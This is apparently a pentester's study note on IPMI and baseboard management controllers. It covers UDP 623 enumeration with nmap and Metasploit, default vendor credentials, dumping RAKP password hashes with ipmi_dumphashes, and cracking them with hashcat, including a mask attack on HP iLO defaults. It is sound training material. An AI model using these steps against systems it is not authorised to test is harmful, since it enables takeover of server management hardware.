---
created: 2026-09-22
updated: 2026-10-09
tags:
  - services_n_protocols
---
## IPMI

>**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** is a set of standardized specifications for hardware-based host management, used to monitor and administer systems independently of the host BIOS, CPU, firmware, and operating system.

- IPMI runs as an autonomous subsystem that operates even when the host is powered off or unresponsive, because it needs only a power source and a LAN connection to function.
- It communicates over a direct network connection to the system hardware and requires no OS login shell, which lets administrators manage a host **before the OS has booted, when it's powered down, or after a system failure**.
- Beyond remote power control, IPMI can monitor temperature, voltage, fan status, and power supplies, query inventory information, review hardware logs, and raise SNMP alerts.

>[!interesting] The protocol was first published by Intel in 1998 and is now supported by over 200 vendors, including Cisco, Dell, HP, and Supermicro. IPMI version 2.0 adds serial-over-LAN, which exposes serial console output in band.

- Systems that implement IPMI are called **Baseboard Management Controllers (BMCs)**:
	- A BMC is typically an embedded ARM system running Linux, either built into the motherboard or added as a PCI card.
	- Access to a BMC is close to physical access: it can monitor, reboot, power off, or reinstall the host operating system.
	- Most BMCs also expose a web management console and a command-line channel such as Telnet or SSH alongside the IPMI network protocol.

>[!important] IPMI communicates over **UDP port `623`**.

>[!interesting]- Common BMC implementations
>- The BMCs most often seen during internal engagements are **HP iLO**, **Dell iDRAC** (also referred to as DRAC), and **Supermicro IPMI**. Each ships with vendor firmware, a web console, and default credentials that administrators frequently leave unchanged.

### IPMI ports

| Port      | Protocol | Description                                                                          |
| --------- | -------- | ------------------------------------------------------------------------------------ |
| `623/udp` | ASF-RMCP | **IPMI network listener** (`asf-rmcp`) used for remote management and RAKP authentication. |

>[!note] The IPMI listener is UDP-only, so it is missed by a default TCP scan. Probe UDP port `623` explicitly to detect it.

### IPMI components

- IPMI depends on several hardware components working together:
	- **Baseboard Management Controller (BMC)** — the micro-controller at the center of an IPMI implementation.
	- **Intelligent Chassis Management Bus (ICMB)** — an interface that allows communication from one chassis to another.
	- **Intelligent Platform Management Bus (IPMB)** — a bus that extends the BMC.
	- **IPMI memory** — storage for the system event log, repository store data, and similar records.
	- **Communication interfaces** — local system interfaces, serial and LAN interfaces, and the ICMB and PCI management buses.
## Enumerating IPMI

### Port scanning and version detection

- Detect the IPMI service and fingerprint its version using the [`ipmi-version`](https://nmap.org/nsedoc/scripts/ipmi-version.html) NSE script over UDP:

```bash
sudo nmap -sU --script ipmi-version -p 623 10.10.11.5
```

| Option     | Description                                        |
| :--------- | :------------------------------------------------- |
| `-sU`      | Scan UDP ports (IPMI listens on UDP `623`).        |
| `--script` | Run a specific NSE script (`ipmi-version`).        |
| `-p`       | Specify the destination port to scan (`623`).      |

>[!example]+ Fingerprinting an HP iLO BMC
> ```bash
> sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
> ```
>
> ```
> Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
> Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
> Host is up (0.00064s latency).
>
> PORT    STATE SERVICE
> 623/udp open  asf-rmcp
> | ipmi-version:
> |   Version:
> |     IPMI-2.0
> |   UserAuth:
> |   PassAuth: auth_user, non_null_user
> |_  Level: 2.0
> MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
>
> Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
> ```

- Fingerprint the protocol version with the Metasploit `ipmi_version` scanner module:

```bash
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set rhosts 10.10.11.5; run; exit"
```

>[!note] `ipmi-version` reports the authentication and password support advertised by the BMC (for example `PassAuth: auth_user, non_null_user`), which confirms the host speaks IPMI 2.0 and is a candidate for the RAKP hash-retrieval attack below.

### Default BMC credentials

- Try known vendor defaults against the web console, SSH, or Telnet interface of any discovered BMC:

| Product         | Username        | Password                                                             |
| --------------- | --------------- | ------------------------------------------------------------------- |
| Dell iDRAC      | `root`          | `calvin`                                                            |
| HP iLO          | `Administrator` | Randomized 8-character string of digits and uppercase letters.      |
| Supermicro IPMI | `ADMIN`         | `ADMIN`                                                             |

>[!tip]+ Test known defaults for every service discovered on a BMC, not only IPMI. The same credentials often unlock the web console, SSH, and Telnet, and are frequently reused elsewhere in the environment.

## Dumping IPMI hashes

- The RAKP authentication exchange in IPMI 2.0 returns a salted SHA1 or MD5 hash of a user's password before authentication completes, so a valid password hash can be retrieved for any existing account on the BMC.
- Retrieve the hashes with the Metasploit [`ipmi_dumphashes`](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) module, which also attempts to crack them against a built-in wordlist:

```bash
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set rhosts 10.10.11.5; run; exit"
```

>[!example]+ Retrieving and auto-cracking a Supermicro hash
> ```
> [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
> [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
> [*] Scanned 1 of 1 hosts (100% complete)
> [*] Auxiliary module execution completed
> ```

>[!note] The `ipmi_dumphashes` module reads usernames and candidate passwords from `data/wordlists/ipmi_users.txt` and `data/wordlists/ipmi_passwords.txt` in the Metasploit tree, and saves captured hashes with `OUTPUT_HASHCAT_FILE` or `OUTPUT_JOHN_FILE`.

## Cracking IPMI hashes

- IPMI 2.0 RAKP hashes are cracked offline with [[Hashcat]] mode `7300`:

```bash
hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
```

- When the BMC is an HP iLO left on its factory default, target the known password format (eight characters of digits and uppercase letters) with a mask attack:

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

| Option | Description                                                                      |
| :----- | :------------------------------------------------------------------------------- |
| `-m`   | Set the hash mode (`7300` for IPMI 2.0 RAKP HMAC-SHA1).                           |
| `-a`   | Set the attack mode (`3` for a brute-force mask attack).                          |
| `-1`   | Define custom charset `1` (`?d?u` = digits and uppercase letters).               |
| `?1`   | Reference custom charset `1` at that position; `?1` × 8 covers an 8-character password. |

>[!note] See [[Hashcat]] for mask and rule syntax and [[🛠️ Password cracking]] for the wider offline-cracking workflow. Experimenting with different wordlists is often what recovers a non-default password.

## References and further reading

- [`IPMI Basics — Thomas-Krenn Wiki`](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)
- [`A Penetration Tester's Guide to IPMI and BMCs — Rapid7`](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi-and-bmcs/)
- [`IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval — Rapid7`](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
- [`ipmi-version NSE script — Nmap`](https://nmap.org/nsedoc/scripts/ipmi-version.html)
- [`623/UDP/TCP - Pentesting IPMI — HackTricks`](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi)
